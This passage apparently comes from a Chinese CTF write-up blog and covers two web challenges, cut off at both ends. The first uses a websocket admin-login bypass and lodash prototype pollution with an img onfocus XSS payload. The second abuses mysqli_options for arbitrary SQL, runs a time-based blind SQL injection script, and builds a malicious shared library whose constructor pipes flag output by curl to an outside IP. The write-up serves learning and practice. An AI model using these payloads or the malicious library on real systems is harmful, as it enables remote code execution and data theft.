&#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(msg)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">        <span class="title function_">handleMsg</span>(data, ws)</span><br><span class="line">    &#125;)</span><br><span class="line">    ws.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> username = ws2username.<span class="title function_">get</span>(ws)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(addr, username, <span class="string">&quot;closed&quot;</span>)</span><br><span class="line">        clients.<span class="title function_">delete</span>(addr)</span><br><span class="line">        username2ws.<span class="title function_">delete</span>(username)</span><br><span class="line">        ws2username.<span class="title function_">delete</span>(ws)</span><br><span class="line">    &#125;)</span><br><span class="line">    ws.<span class="title function_">on</span>(<span class="string">&#x27;ping&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        ws.<span class="title function_">send</span>(<span class="string">&#x27;pong&#x27;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ping&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wss.<span class="title function_">on</span>(<span class="string">&#x27;connection&#x27;</span>, <span class="function">(<span class="params">ws, req</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; <span class="attr">remoteAddress</span>:host, <span class="attr">remotePort</span>:port &#125; = req.<span class="property">socket</span> </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(host, port)</span><br><span class="line">    clients.<span class="title function_">set</span>(<span class="string">`<span class="subst">$&#123;host&#125;</span>:<span class="subst">$&#123;port&#125;</span>`</span>, ws)</span><br><span class="line">    <span class="title function_">handleConn</span>(ws, <span class="string">`<span class="subst">$&#123;host&#125;</span>:<span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// wss.on(&#x27;listening&#x27;, () =&gt; &#123;</span></span><br><span class="line"><span class="comment">//     console.log(&#x27;listening...&#x27;)</span></span><br><span class="line"><span class="comment">// &#125;)</span></span><br><span class="line"></span><br><span class="line">http.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="variable constant_">LISTEN</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`listening on <span class="subst">$&#123;LISTEN&#125;</span>:<span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678206008181-c2584eb8-971b-4677-98b8-5d07662140da.png#averageHue=%23fcfbfb&clientId=u7e1e3703-b617-4&from=paste&height=382&id=u03feb697&name=image.png&originHeight=478&originWidth=1434&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=77691&status=done&style=none&taskId=u5045235d-4eb7-41dc-9e79-07391ade777&title=&width=1147.2" alt="image.png"><br>一共有2个bot和一个服务端，服务端就是对请求进行处理，adminbot就是停留在chat界面的一个bot，被xss的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678206321683-163cb8b3-d3f2-4e7a-93c6-0586a431ca02.png#averageHue=%23e5e5e4&clientId=u7e1e3703-b617-4&from=paste&height=774&id=u6b67f7ec&name=image.png&originHeight=967&originWidth=1528&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37393&status=done&style=none&taskId=ue3b2ca4b-1b46-4ce0-b925-d1dffc17e62&title=&width=1222.4" alt="image.png"><br>这里对text类型的数据进行了过滤，不能xss，在F12可以看出这是一个react写的web，并且源码可见：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678206533520-3cf599c9-ed8d-4f81-aacc-7930af57e3bd.png#averageHue=%23fdfbfa&clientId=u7e1e3703-b617-4&from=paste&height=190&id=ub94c3d63&name=image.png&originHeight=238&originWidth=1043&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=28594&status=done&style=none&taskId=uc5978c20-4e69-4a3a-8ece-b173be611c1&title=&width=834.4" alt="image.png"><br>这里可以利用图片进行xss，然后强行让admin用户跳转下线，我们登录admin账户调用api获取flag，但是首先<code>this.props.allowImage &amp;&amp; attrs.wow</code>要为true，因此还需要进行原型链污染，审计员吗可以得知该js调用了lodash库，存在原型链污染：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678206611470-4a9c2013-ab76-4b2e-82df-c9bcdc1b80ac.png#averageHue=%23fefdfc&clientId=u7e1e3703-b617-4&from=paste&height=194&id=ud987c602&name=image.png&originHeight=242&originWidth=1014&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26161&status=done&style=none&taskId=u7dcdb9d0-63e2-49f5-bcb0-c8c0ef85f58&title=&width=811.2" alt="image.png"><br>在对tpl进行渲染时调用了merge，其中第二个参数就是tpl页面的内容，我们可控，因此思路很清晰<br>flagbot里面设置了主要的api，flag对应的api是getflag，只要调用该websockets的getflag api就可以立马获取flag，但是首先需要通过一个判断：<br><code> if(from === &#39;admin&#39;)</code>,其实这个好说，不就是websockes请求时发时发送一个from&#x3D;admin吗，因此这一题出现了严重的非预期，这是因为没有对admin登录进行处理，我们只需要：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://127.0.0.1:8081&quot;</span>)</span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(), data.<span class="title function_">toString</span>())</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (data.<span class="property">api</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;login&quot;</span>:</span><br><span class="line">            <span class="title function_">getFlag</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getFlag</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;get flag&quot;</span>)</span><br><span class="line">    <span class="comment">// admin 被踢后不会立刻下线，设置个 1000 ms 延时</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">api</span>: <span class="string">&quot;login&quot;</span>, <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span> &#125;))</span><br><span class="line">        <span class="keyword">const</span> payload = &#123;</span><br><span class="line">            <span class="attr">api</span>: <span class="string">&quot;getflag&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(payload))</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行后flag就出来了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678206745722-e12d30e8-88b8-4741-9d2c-c221c1d8523b.png#averageHue=%23212321&clientId=u7e1e3703-b617-4&from=paste&height=254&id=u2d99e9af&name=image.png&originHeight=317&originWidth=1871&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=777284&status=done&style=none&taskId=u8cde2a6f-fe40-442d-9482-96d04ec2abb&title=&width=1496.8" alt="image.png"></p>
<p>但是我们追求预期解法，预期解法就是利用tpl原型链污染，污染allowimage属性，从而可以上传img图像，然后利用img xss让admin界面随便跳转下线，我们上号获取flag</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">WebSocket</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;ws&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`window.location.href = &#x27;https://www.baidu.com&#x27;`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// const ws = new WebSocket(&quot;ws://127.0.0.1:8081&quot;)</span></span><br><span class="line"><span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://127.0.0.1:8081&quot;</span>)</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(), data.<span class="title function_">toString</span>())</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (data.<span class="property">api</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;login&quot;</span>:</span><br><span class="line">            <span class="title function_">doLogin</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(), <span class="string">&quot;message&quot;</span>, data)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;open&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// apiList()</span></span><br><span class="line">        <span class="title function_">prototypePollution</span>()</span><br><span class="line">        <span class="title function_">sendImage</span>()</span><br><span class="line">        <span class="title function_">getFlag</span>()</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doLogin</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// ws.send(JSON.stringify(&#123; api: &quot;login&quot;, username: (Math.random() + 1).toString(36) &#125;))</span></span><br><span class="line">    ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">api</span>: <span class="string">&quot;login&quot;</span>, <span class="attr">username</span>: <span class="string">&quot;admin&quot;</span> &#125;))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">prototypePollution</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> payload = &#123;</span><br><span class="line">        <span class="attr">api</span>: <span class="string">&quot;sendmsg&quot;</span>,</span><br><span class="line">        <span class="attr">to</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="attr">msg</span>: &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&quot;tpl&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123;</span><br><span class="line">                <span class="attr">tpl</span>: <span class="string">&quot;test.tpl&quot;</span>,</span><br><span class="line">                <span class="attr">ctx</span>: <span class="string">&#x27;&#123; &quot;constructor&quot;: &#123; &quot;prototype&quot;: &#123; &quot;allowImage&quot;: true &#125; &#125; &#125;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(payload))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sendImage</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;send image&quot;</span>)</span><br><span class="line">    <span class="keyword">const</span> payload = &#123;</span><br><span class="line">        <span class="attr">api</span>: <span class="string">&quot;sendmsg&quot;</span>,</span><br><span class="line">        <span class="attr">to</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="attr">msg</span>: &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&quot;image&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123;</span><br><span class="line">                <span class="attr">src</span>: <span class="string">&quot;http://www.baidu.com&quot;</span>,</span><br><span class="line">                <span class="attr">attrs</span>: <span class="string">&#x27;&#123;&quot;id&quot;:&quot;x&quot;,&quot;tabindex&quot;:1,&quot;is&quot;:&quot;focus&quot;,&quot;autofocus&quot;:true,&quot;wow&quot;:true,&quot;onfocus&quot;:&quot;eval(atob(`&#x27;</span> + <span class="title class_">Buffer</span>.<span class="title function_">from</span>(code).<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>) + <span class="string">&#x27;`))&quot;&#125;&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(payload))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getFlag</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;get flag&quot;</span>)</span><br><span class="line">    <span class="comment">// admin 被踢后不会立刻下线，设置个 1000 ms 延时</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">api</span>: <span class="string">&quot;login&quot;</span>, <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span> &#125;))</span><br><span class="line">        <span class="keyword">const</span> payload = &#123;</span><br><span class="line">            <span class="attr">api</span>: <span class="string">&quot;getflag&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(payload))</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678206832701-4c215fea-dfca-4459-b0c6-22a3b5f9aa2c.png#averageHue=%23212320&clientId=u7e1e3703-b617-4&from=paste&height=190&id=u48e917b9&name=image.png&originHeight=237&originWidth=1057&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=347667&status=done&style=none&taskId=u58cb00ea-8332-4ee7-966c-944f60a8d81&title=&width=845.6" alt="image.png"></p>
<h1 id="myclient"><a href="#myclient" class="headerlink" title="myclient"></a>myclient</h1><p>考点：mysql_options可控，mysql加载恶意so</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_init</span>();</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>) &gt; <span class="number">1500</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mysqli_options</span>(<span class="variable">$con</span>, <span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_options</span>(<span class="variable">$con</span>, MYSQLI_OPT_LOCAL_INFILE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_real_connect</span>(<span class="variable">$con</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;test123456&quot;</span>, <span class="string">&quot;mysql&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;connect failed&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;connect success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$content</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其实这一题和TQLCTF中的SQL_TEST一模一样：<br>不同点是TQLCTF中用的是phar反序列化去RCE，我们这是用恶意so文件进行RCE<br>在这里我们可控的参数就是key和value，在mysqli_options选项中使用到了，先看看这个选项有什么：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678207741176-0ad15c4f-b2e4-4b8e-adb1-c7f457e2202d.png#averageHue=%23e8e8e8&clientId=u793420f0-3271-4&from=paste&id=uc787a79d&name=image.png&originHeight=1434&originWidth=1706&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=305223&status=done&style=none&taskId=u30725362-2a1c-4d12-ae85-1d89311b5f2&title=" alt="image.png"><br>其中注意一个MYSQLI_INIT_COMMAND,这个选项可以让我们在建立mysql连接时，执行一条自定义的语句，也就是可控value指定的，那么我们就可以执行任意SQL语句了<br>正常情况的话，这样我们是可以写shell到网站目录下的，我们可以尝试一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678208135644-60b61a52-9577-4b53-8db2-d5588a077a1d.png#averageHue=%23adadad&clientId=u793420f0-3271-4&from=paste&height=686&id=ua93c2a8a&name=image.png&originHeight=858&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=72359&status=done&style=none&taskId=ud06013e9-c0b7-4756-9897-88d992a4836&title=&width=1536" alt="image.png"><br>这里延时了5s（3就是MYSQLI_INIT_COMMAND的值)，说明执行指令是成功的，只是没有回显，我们再试试写shell：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678208204188-0094768d-54d8-45ef-aee4-215a35203e5a.png#averageHue=%23c8c8c8&clientId=u793420f0-3271-4&from=paste&height=534&id=u090cc0c1&name=image.png&originHeight=668&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56777&status=done&style=none&taskId=u36b5b8ea-3a9a-41d8-ab89-fccd6b38067&title=&width=1536" alt="image.png"><br>提示我们有<code>--secure-file-priv</code>选项，这个选项会限制我们读写的文件，因此我们现在要做的是确定这个限制的文件夹位置，写个脚本盲注一下：<br>我们可以通过<code>select @@global.secure_file_priv</code>确定文件夹：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678208487067-bccc9705-543d-4962-af6b-ff8a524fe65f.png#averageHue=%23fefefe&clientId=u793420f0-3271-4&from=paste&height=223&id=uc2828690&name=image.png&originHeight=279&originWidth=786&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10497&status=done&style=none&taskId=uabf52fa1-d609-4d64-868b-2b26e6a17b3&title=&width=628.8" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://localhost:10047/index.php?key=3&amp;value=&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload=<span class="string">f&quot;select if(ascii(substr((select @@global.secure_file_priv),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.2),0)&quot;</span></span><br><span class="line">        t1=time.time()</span><br><span class="line">        r=requests.get(url=url+payload)</span><br><span class="line">        t2=time.time()</span><br><span class="line">        <span class="built_in">print</span>(t2-t1)</span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">0.2</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">1</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678208603640-8ce75169-5a28-47bc-a5e0-9d31f89d7806.png#averageHue=%232f2e2d&clientId=u793420f0-3271-4&from=paste&height=90&id=u055aa352&name=image.png&originHeight=112&originWidth=704&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14533&status=done&style=none&taskId=u5ddb4861-3499-49d9-b8fb-529d19451b9&title=&width=563.2" alt="image.png"><br>得到secure_file_priv后，我们就可以进行下一步的操作，也就是将so文件写入，然后通过<code>MYSQLI_READ_DEFAULT_FILE</code>更改配置文件目录:<br>先准备一个恶意的mysql配置库：<br>恶意so：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/readflag | curl -XPOST http://192.168.0.107:8888/ -d @-&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后将恶意so转为十六进制，这个我们可以利用本地mysql使用<code>select hex(load_file(&quot;path&quot;)) into outfile &quot;xxx&quot;</code>即可<br>然后准备一手恶意cnf配置文件：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[client]<span class="comment">#</span></span><br><span class="line">plugin_dir=/tmp/<span class="attribute">e10adc3949ba59abbe56e057f20f883e</span> <span class="comment">#</span></span><br><span class="line">default_auth=evil450 <span class="comment">#</span></span><br><span class="line">default_authentication_plugin = evil450 <span class="comment">#</span></span><br><span class="line">default_authentication = evil450 <span class="comment">#</span></span><br><span class="line">init-command=SELECT 0x[恶意SO十六进制] INTO DUMPFILE <span class="string">&quot;/tmp/e10adc3949ba59abbe56e057f20f883e/evil450.so&quot;</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>最后将该文件进行上述一样的操作转为十六进制文件。最后写一个py脚本写入服务器：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> 